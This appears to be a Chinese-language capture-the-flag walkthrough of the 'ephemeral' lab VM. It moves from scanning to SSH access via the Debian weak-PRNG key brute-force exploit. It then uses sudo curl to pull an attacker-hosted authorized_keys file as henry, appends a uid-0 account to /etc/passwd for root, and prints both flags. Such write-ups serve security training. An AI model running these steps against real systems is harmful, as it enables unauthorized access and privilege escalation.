# 信息搜集

主机发现

```
┌──(root㉿kali)-[~]
└─# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:39:60:4c, IPv4: 192.168.43.126
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.43.1    c6:45:66:05:91:88       (Unknown: locally administered)
192.168.43.197  04:6c:59:bd:33:50       Intel Corporate
192.168.43.201  08:00:27:02:db:9c       PCS Systemtechnik GmbH
192.168.43.190  52:e3:0c:b3:67:97       (Unknown: locally administered)

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.972 seconds (129.82 hosts/sec). 4 responded
```

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap --min-rate 10000 -p- 192.168.43.201
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-31 01:32 EDT
Nmap scan report for ephemeral (192.168.43.201)
Host is up (0.00040s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:02:DB:9C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.98 seconds
                                                                
┌──(kali㉿kali)-[~]
└─$ nmap -sS -sV -O -p22,80 192.168.43.201  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-31 01:32 EDT
Nmap scan report for ephemeral (192.168.43.201)
Host is up (0.00036s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
MAC Address: 08:00:27:02:DB:9C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.82 seconds
```

# 漏洞利用

目录扫描

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.43.201 -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x html,txt,php,jpg,png,zip,git
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.43.201
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php,jpg,png,zip,git,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 10918]
/note.txt             (Status: 200) [Size: 159]
/agency               (Status: 301) [Size: 315] [--> http://192.168.43.94/agency/]                                                
/.html                (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
/logitech-quickcam_w0qqcatrefzc5qqfbdz1qqfclz3qqfposz95112qqfromzr14qqfrppz50qqfsclz1qqfsooz1qqfsopz1qqfssz0qqfstypez1qqftrtz1qqftrvz1qqftsz2qqnojsprzyqqpfidz0qqsaatcz1qqsacatzq2d1qqsacqyopzgeqqsacurz0qqsadisz200qqsaslopz1qqsofocuszbsqqsorefinesearchz1.html (Status: 403) [Size: 278]                                          
Progress: 9482032 / 9482040 (100.00%)
===============================================================
Finished
===============================================================
```

/mote.txt

![image](https://github.com/user-attachments/assets/d386e66c-d06f-4457-b54f-f28585cbd27c)

搜索一下 OpenSSH 8.2p1的漏洞

```
┌──(kali㉿kali)-[~]
└─$ searchsploit openssl ssh
------------------------------- ---------------------------------
 Exploit Title                 |  Path
------------------------------- ---------------------------------
OpenSSL 0.9.8c-1 < 0.9.8g-9 (D | linux/remote/5622.txt
OpenSSL 0.9.8c-1 < 0.9.8g-9 (D | linux/remote/5632.rb
OpenSSL 0.9.8c-1 < 0.9.8g-9 (D | linux/remote/5720.py
------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
                                                                 
┌──(kali㉿kali)-[~]
└─$ searchsploit -m 5720    
  Exploit: OpenSSL 0.9.8c-1 < 0.9.8g-9 (Debian and Derivatives) - Predictable PRNG Brute Force SSH
      URL: https://www.exploit-db.com/exploits/5720
     Path: /usr/share/exploitdb/exploits/linux/remote/5720.py
    Codes: OSVDB-45029, CVE-2008-3280, CVE-2008-0166
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /home/kali/5720.py
```

利用

```
┌──(kali㉿kali)-[~]
└─$ wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/5622.tar.bz2
--2025-05-30 10:46:15--  https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/5622.tar.bz2
Resolving gitlab.com (gitlab.com)... 172.65.251.78, 2606:4700:90:0:f22e:fbec:5bed:a9b9
Connecting to gitlab.com (gitlab.com)|172.65.251.78|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 50226987 (48M) [application/octet-stream]
Saving to: ‘5622.tar.bz2’

5622.tar.bz2     35%[=>      ]  16.88M  7.15KB/s    in 6m 15s  

2025-05-30 10:52:32 (46.1 KB/s) - Read error at byte 17701470/50226987 (Error in the pull function.). Retrying.

--2025-05-30 10:52:33--  (try: 2)  https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/5622.tar.bz2
Connecting to gitlab.com (gitlab.com)|172.65.251.78|:443... connected.
HTTP request sent, awaiting response... 206 Partial Content
Length: 50226987 (48M), 32525517 (31M) remaining [application/octet-stream]
Saving to: ‘5622.tar.bz2’

5622.tar.bz2    100%[++=====>]  47.90M  2.44MB/s    in 15s     

2025-05-30 10:52:49 (2.09 MB/s) - ‘5622.tar.bz2’ saved [50226987/50226987]

                                                                
┌──(kali㉿kali)-[~]
└─$ tar -xvf 5622*

┌──(kali㉿kali)-[~]
└─$ python2 5720.py rsa/2048 192.168.43.201 randy

Key Found in file: 0028ca6d22c68ed0a1e3f6f79573100a-31671
Execute: ssh -lrandy -p22 -i rsa/2048/0028ca6d22c68ed0a1e3f6f79573100a-31671 192.168.43.201

Tested 26920 keys | Remaining 5848 keys | Aprox. Speed 3/sec
```

链接ssh

```
┌──(kali㉿kali)-[~]
└─$ ssh -lrandy -p22 -i rsa/2048/0028ca6d22c68ed0a1e3f6f79573100a-31671 192.168.43.201
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.13.0-30-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

193 updates can be applied immediately.
127 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

New release '22.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Your Hardware Enablement Stack (HWE) is supported until April 2025.
Last login: Fri Jun 24 01:17:05 2022 from 10.0.0.69
randy@ephemeral:~$
```

# 权限提升

看一看都有什么

```
randy@ephemeral:~$ ls -la
total 56
drwxr-xr-x 11 randy randy 4096 Jun 23  2022 .
drwxr-xr-x  4 root  root  4096 Jun 23  2022 ..
lrwxrwxrwx  1 randy randy    9 Jun 23  2022 .bash_history -> /dev/null                                                          
-rw-r--r--  1 randy randy  220 Jun 23  2022 .bash_logout
-rw-r--r--  1 randy randy 3771 Jun 23  2022 .bashrc
drwxrwxr-x 10 randy randy 4096 Jun 23  2022 .cache
drwx------ 11 randy randy 4096 Jun 23  2022 .config
drwxr-xr-x  3 randy randy 4096 Jun 23  2022 Desktop
drwxr-xr-x  2 randy randy 4096 Jun 23  2022 Documents
drwxr-xr-x  2 randy randy 4096 Jun 23  2022 Downloads
drwx------  3 randy randy 4096 Jun 23  2022 .gnupg
drwxr-xr-x  3 randy randy 4096 Jun 23  2022 .local
-rw-r--r--  1 randy randy  807 Jun 23  2022 .profile
drwxr-xr-x  2 randy randy 4096 Jun 23  2022 Public
drwx------  2 randy randy 4096 Jun 23  2022 .ssh
-rw-r--r--  1 randy randy    0 Jun 23  2022 .sudo_as_admin_successful
randy@ephemeral:~$ sudo -l
Matching Defaults entries for randy on ephemeral:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User randy may run the following commands on ephemeral:
    (henry) NOPASSWD: /usr/bin/curl
randy@ephemeral:~$ find / -perm -u=s -type f 2>/dev/null
/usr/sbin/pppd
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/umount
/usr/bin/su
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/xorg/Xorg.wrap
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/home/randy/Desktop/vmware-tools-distrib/lib/bin32/vmware-user-suid-wrapper
/home/randy/Desktop/vmware-tools-distrib/lib/bin64/vmware-user-suid-wrapper
/snap/core20/1328/usr/bin/chfn
/snap/core20/1328/usr/bin/chsh
/snap/core20/1328/usr/bin/gpasswd
/snap/core20/1328/usr/bin/mount
/snap/core20/1328/usr/bin/newgrp
/snap/core20/1328/usr/bin/passwd
/snap/core20/1328/usr/bin/su
/snap/core20/1328/usr/bin/sudo
/snap/core20/1328/usr/bin/umount
/snap/core20/1328/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1328/usr/lib/openssh/ssh-keysign
/snap/core20/1518/usr/bin/chfn
/snap/core20/1518/usr/bin/chsh
/snap/core20/1518/usr/bin/gpasswd
/snap/core20/1518/usr/bin/mount
/snap/core20/1518/usr/bin/newgrp
/snap/core20/1518/usr/bin/passwd
/snap/core20/1518/usr/bin/su
/snap/core20/1518/usr/bin/sudo
/snap/core20/1518/usr/bin/umount
/snap/core20/1518/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1518/usr/lib/openssh/ssh-keysign
/snap/snapd/24505/usr/lib/snapd/snap-confine
randy@ephemeral:~$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/ping = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/snap/core20/1328/usr/bin/ping = cap_net_raw+ep
/snap/core20/1518/usr/bin/ping = cap_net_raw+ep
randy@ephemeral:~$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
randy:x:1000:1000:randy,,,:/home/randy:/bin/bash
henry:x:1001:1001::/home/henry:/bin/bash
```

我们可以利用curl来进行提权

![image](https://github.com/user-attachments/assets/32e3fa69-181a-4b85-8a5d-c95c86a0035a)

提权

```
┌──(kali㉿kali)-[~]
└─$ ssh-keygen -t rsa -f /home/kali/henry     
Generating public/private rsa key pair.
Enter passphrase for "/home/kali/henry" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kali/henry
Your public key has been saved in /home/kali/henry.pub
The key fingerprint is:
SHA256:+A/dwXaQ24lEKUSPRNeM3Gf9v/W2npnbugE3uqT/rXU kali@kali
The key's randomart image is:
+---[RSA 3072]----+
|         +=.o*  .|
|         ..=+.+ +|
|          ..=  o.|
|       .   o = ..|
|      . S   B * .|
|       . . o * .o|
|        o . + . E|
|         o o . =O|
|          o.o.*%=|
+----[SHA256]-----+
┌──(kali㉿kali)-[~]
└─$ mv henry.pub authorized_keys
randy@ephemeral:~$ sudo -u henry /usr/bin/curl http://192.168.43.126/authorized_keys -o /home/henry/.ssh/authorized_keys
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- 100   563  100   563    0     0  31277      0 --:--:-- --:--:-- --:--:-- 31277
┌──(kali㉿kali)-[~]
└─$ ssh henry@192.168.43.201 -i henry          
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.13.0-30-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

193 updates can be applied immediately.
127 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

New release '22.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Your Hardware Enablement Stack (HWE) is supported until April 2025.
Last login: Fri Jun 24 01:30:47 2022 from 10.0.0.69
henry@ephemeral:~$ 
```

看一下都有什么

```
henry@ephemeral:~$ ls -la
total 40
drwxr-xr-x 6 henry henry 4096 Jun 24  2022 .
drwxr-xr-x 4 root  root  4096 Jun 23  2022 ..
lrwxrwxrwx 1 root  root     9 Jun 23  2022 .bash_history -> /dev/null                                                           
-rw-r--r-- 1 henry henry  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 henry henry 3771 Feb 25  2020 .bashrc
drwx------ 4 henry henry 4096 Jun 24  2022 .cache
drwx------ 4 henry henry 4096 Jun 24  2022 .config
drwxrwxr-x 3 henry henry 4096 Jun 23  2022 .local
-rw-r--r-- 1 henry henry  807 Feb 25  2020 .profile
drwx------ 2 henry henry 4096 May 31 02:12 .ssh
-rw------- 1 henry henry   33 Jun 23  2022 user.txt
henry@ephemeral:~$ sudo -l
[sudo] password for henry: 
Sorry, try again.
[sudo] password for henry: 
Sorry, try again.
[sudo] password for henry: 
sudo: 3 incorrect password attempts
henry@ephemeral:~$ find / -perm -u=s -type f 2>/dev/null
/usr/sbin/pppd
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/umount
/usr/bin/su
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/xorg/Xorg.wrap
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/home/randy/Desktop/vmware-tools-distrib/lib/bin32/vmware-user-suid-wrapper
/home/randy/Desktop/vmware-tools-distrib/lib/bin64/vmware-user-suid-wrapper
/snap/core20/1328/usr/bin/chfn
/snap/core20/1328/usr/bin/chsh
/snap/core20/1328/usr/bin/gpasswd
/snap/core20/1328/usr/bin/mount
/snap/core20/1328/usr/bin/newgrp
/snap/core20/1328/usr/bin/passwd
/snap/core20/1328/usr/bin/su
/snap/core20/1328/usr/bin/sudo
/snap/core20/1328/usr/bin/umount
/snap/core20/1328/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1328/usr/lib/openssh/ssh-keysign
/snap/core20/1518/usr/bin/chfn
/snap/core20/1518/usr/bin/chsh
/snap/core20/1518/usr/bin/gpasswd
/snap/core20/1518/usr/bin/mount
/snap/core20/1518/usr/bin/newgrp
/snap/core20/1518/usr/bin/passwd
/snap/core20/1518/usr/bin/su
/snap/core20/1518/usr/bin/sudo
/snap/core20/1518/usr/bin/umount
/snap/core20/1518/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1518/usr/lib/openssh/ssh-keysign
/snap/snapd/24505/usr/lib/snapd/snap-confine
henry@ephemeral:~$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/ping = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/snap/core20/1328/usr/bin/ping = cap_net_raw+ep
/snap/core20/1518/usr/bin/ping = cap_net_raw+ep
```

user.txt

```
henry@ephemeral:~$ cat user.txt 
9c8e36b0cb30f09300592cb56bca0c3a
```

提权

```
henry@ephemeral:~$ openssl passwd -1 -salt 1234 1234
$1$1234$BdIMOAWFOV2AQlLsrN/Sw.
henry@ephemeral:~$ echo '1234:$1$1234$BdIMOAWFOV2AQlLsrN/Sw.:0:0:root:/root:/bin/bash' >> /etc/passwd
henry@ephemeral:~$ su 1234
Password: 
root@ephemeral:/home/henry# id
uid=0(root) gid=0(root) groups=0(root)
```

root.txt

```
root@ephemeral:~# cat root.txt 
b0a3dec84d09f03615f768c8062cec4d
```
